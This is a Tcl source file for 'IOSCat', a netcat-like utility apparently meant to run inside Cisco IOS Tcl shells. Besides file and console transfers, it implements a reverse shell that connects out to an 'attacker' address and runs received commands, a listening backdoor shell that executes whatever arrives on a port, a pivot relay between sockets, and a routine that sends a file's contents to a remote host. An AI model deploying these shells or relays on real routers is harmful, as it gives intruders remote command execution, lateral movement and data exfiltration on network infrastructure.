###################################################
# Global Variables
###################################################


set outfile ""



###################################################
# Input - listen on network port
# Output - write to file
#
# EOF handled correctly
###################################################


proc callbackf2n {sock addr port} {
   fconfigure $sock -translation lf -buffering line
   flush $sock
   fileevent $sock readable [list net2fileb $sock]
}

proc net2fileb {sock} {
   global var
   global outfile
   if {[eof $sock] || [catch {gets $sock line}]} {
      set var 1
   } else {
      puts $outfile $line
      flush $sock
   }
}


proc net2file { port tofile } {
global outfile
set outfile [ open $tofile w ]
set sh [socket -server callbackf2n $port]
vwait var
close $sh
close $outfile
exit
}

###################################################
# Input - listen on local port
# Output - write to remote listener
#
# EOF handled correctly 
# PIVOT file transfer
# PIVOT shell access
#
#     proc n2n { inport ip outport }
#
###################################################




 proc n2n { inport ip outport } {
     global global_ip
     global global_outport

     set global_outport $outport
     set global_ip $ip

     set sockin [socket -server callbackn2n $inport]
   vwait forever
 }

proc callbackn2n {sockin addr inport} {
    global global_outport
    global global_ip
   
    set sockout [ socket $global_ip $global_outport]
    fconfigure $sockout -buffering none -blocking 0 -translation crlf

    fileevent $sockout readable [list n2nfromServer $sockout $sockin]

    fileevent $sockin readable [ list n2nfromClient $sockin $sockout ]
    fconfigure $sockin -blocking 0 -buffering none -encoding binary -translation crlf 


}


 proc n2nfromServer {sockout sockin} {
 
     while {[gets $sockout line] >= 0 } {
              puts $sockin $line
     } 

 }


proc n2nfromClient {sockin sockout} {
    set data x
    while {[string length $data]} {
    set data [ read $sockin 4096]
      if {[eof $sockin] } {
             close $sockin
            close $sockout
            exit
         }
      if {[string length $data]} {
         puts $sockout $data
         }
      }
}





###################################################
# Input - input from STDIN (keyboard)
# Output - write to remote listener
#
# EOF handled correctly
###################################################

 proc c2n { ip port } {
     set sock [socket $ip $port]
     fconfigure $sock -buffering none -blocking 0 -encoding binary -translation crlf -eofchar {}
     fconfigure stdout -buffering none
     fileevent $sock readable [list c2nfromServer $sock]
     fileevent stdin readable [list c2ntoServer $sock]
     vwait ($sock)
 }

 proc c2ntoServer {sock} {
     if {[gets stdin line] >= 0} {
         puts $sock $line
         c2nfromServer $sock
     } else {
         close $sock
         exit
     }
 }


proc c2nfromServer {sock} {
     set data x
     while {[string length $data]} {
         set data [read $sock 4096]
         if {[eof $sock]} {
             close $sock
             exit
         }
         if {[string length $data]} {
             puts -nonewline stdout $data
         }
     }
 }


######################################################
# Input - console
# Output - console shovelled to remote listener
# reverse shell
#
# EOF handled correctly
###################################################

 proc c2n_revshell { ip outport } {
     puts "$ip $outport"

     global global_ip
     global global_outport

     set global_outport $outport
     set global_ip $ip

    set sockout [ socket $ip $outport]
    puts stdout "socket is $sockout"

    fconfigure $sockout -blocking 0 -translation lf -buffering line

    fileevent $sockout readable [list n2cfromAttacker_revshell $sockout]
    vwait forever
 }

 proc n2cfromAttacker_revshell {sockout} {
    set data x
    gets $sockout data
      if {[eof $sockout] } {
            close $sockout
            exit
         }
  
      if {[string length $data] > 0} {
          puts stdout "cmd is $data"
         set cmdoutput [ exec $data ] 
            puts stdout $cmdoutput        
         puts $sockout $cmdoutput
         }
      
}

######################################################
# Input - network
# Output - shell
# backdoor shell
#
# end session from client side
#
###################################################

proc callbackrs {sock addr port} {
   fconfigure $sock -translation lf -buffering line
   fileevent $sock readable [list echoshell $sock]
}

proc echoshell {sock} {
   if {[eof $sock] || [catch {gets $sock line}]} {
   } else {
      set response [exec "$line"]
      puts $sock $response
      flush $sock
   }
}

proc rootshell { port } {
    set sh [socket -server callbackrs $port]
    vwait forever
}

######################################################

proc parseports { port } {
  if { $port > 0 && $port < 65536 } { return 0 } else { return 1 }
}


###################################################
# Input - STDIN (console keyboard)
# Output - write to file
#
# EOF NOT handled correctly - Ctrl-C to terminate
###################################################


proc con2file { tofile } {
  set fileID [ open $tofile w ]
  while { [ gets stdin line ] >=0} {
  puts $fileID $line
  }
close $fileID
}

###################################################
# Input - read from file
# Output - write to remote listener on network
#
# EOF handled correctly
# CRLF issues, depending on platform
###################################################


proc file2net {infile destip port} {
        set fileID [open $infile r ]
	set sock [socket $destip $port]

  while { [ gets $fileID line ] >= 0 } {
                puts $sock $line
		flush $sock
		}
        close $sock
        close $fileID

	return
}


###################################################
# Input - read from file
# Output - write to STDOUT (console screen)
#
# EOF handled correctly
###################################################

proc file2con { fromfile } {
  set fileID [ open $fromfile r ]
  while { [ gets $fileID line ] >= 0 } {
    puts stdout $line
  }
  close $fileID
}


###################################################
# Input - read from file
# Output - write to file
#
# EOF handled correctly
###################################################

proc file2file { fromfile tofile } {
  set fileID1 [ open $fromfile r ]
  set fileID2 [ open $tofile w ]
  while { [ gets $fileID1 line ] >= 0 } {
    puts $fileID2 $line
  }
  close $fileID1
  close $fileID2
}


###################################################
# HELP / SYNTAX output
###################################################

proc syntaxhelp {} {
  puts stdout  "================================================================"
  puts stdout  "IOSCat v0.1 (http://sourceforge.net/projects/iostools)"
  puts stdout  "This implements a subset of the NC you may be familiar with"
  puts stdout  "Port Scanning and UDP support is NOT in play on this version"
  puts stdout  "\7================================================================"
  puts stdout "connect from something to something, then move data between them"
  puts stdout "Syntax is ioscat.tcl <input arguments> <output arguments>"
  puts stdout "     -h this helptext"
  puts stdout "     -iffname   take local file <fname> as input"
  puts stdout "     -offname   take local file <fname> as output"
  puts stdout "     -ic        input from console STDIN"
  puts stdout "     -oc        output to local console STDOUT"
  puts stdout "     -ipnn      listen for input on tcp port <nn>"
  puts stdout "     -oax.x.x.x output to network ip address x.x.x.x (requires -op)"
  puts stdout "     -opnn      output to network tcp port <nn>"
  puts stdout "     -ie        input from local IOS Shell (used for reverse shell)"
  puts stdout "     -oe        output to local IOS Shell (used for backdoor shell)"
  puts stdout  "================================================================"
  
  exit
}
 	

set timeout 1

# ========================================================
# Mainline code starts here
# ========================================================
#
# first, lets parse the command line
#
foreach arg $argv  {
    if { $arg == "-h" || $arg == "-H" || $arg == "-?" || $arg =="?"  } { syntaxhelp }

    set strlen  [ string length $arg  ]
    set cutr [ expr $strlen - 3 ]
    
    set actionarg  [ string range $arg 3 $strlen ]
    set action [ string range $arg 1 2 ] 

    switch -glob -- $action {

        ic { set src "c" }           
        oc { set dst "c" } 
        if { 
              set src "f" 
              set srcfile $actionarg
             }
        of  {
              set dst "f"
              set dstfile $actionarg
             }             
        ip  {
              set src "n"
              set srcport $actionarg
             } 
        oa  {
              set dst "n"
              set dstip $actionarg

             }
        op  {
              set dst "n"
              set dstport $actionarg
             }
 
        ie  {
              set src "e"
             }
        oe  {
              set dst "e"
             }
        default { syntaxhelp }
        }
}
 
set callproc $src$dst
puts "callproc is $callproc"

   switch -glob -- $callproc {
         ff  { file2file $srcfile $dstfile }
         nf  { net2file $srcport $dstfile }
         cf  { con2file $dstfile }
         fn  { file2net $srcfile $dstip $dstport }
         nn  { n2n $srcport $dstip $dstport }
         cn  { c2n $dstip $dstport }
         en  { c2n_revshell $dstip $dstport }
         fc  { file2con $srcfile }
         ne  { rootshell $srcport }
         default { syntaxhelp }
         }

 




 


# =====================================

#parse ip / ip ranges

#are all ip's valid?
#are all ports valid?


